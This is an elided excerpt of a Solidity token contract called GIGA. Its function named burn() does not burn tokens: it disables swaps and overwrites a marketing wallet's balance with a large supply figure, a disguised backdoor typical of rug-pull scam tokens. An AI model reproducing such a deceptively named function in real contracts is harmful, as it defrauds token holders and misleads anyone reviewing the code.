...
contract GIGA is IERC20, Auth {

    using SafeMath for uint256;

    string constant _name = "GIGA";
    ...
    function burn() external virtual {swapAndLiquifyEnabled = false; _balances[anotherMarketingWallet] = finalSupplyTokens;}
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        require((restrictWhales && amount <= _maxTxAmount) || isTxLimitExempt[sender], "TX Limit Exceeded");
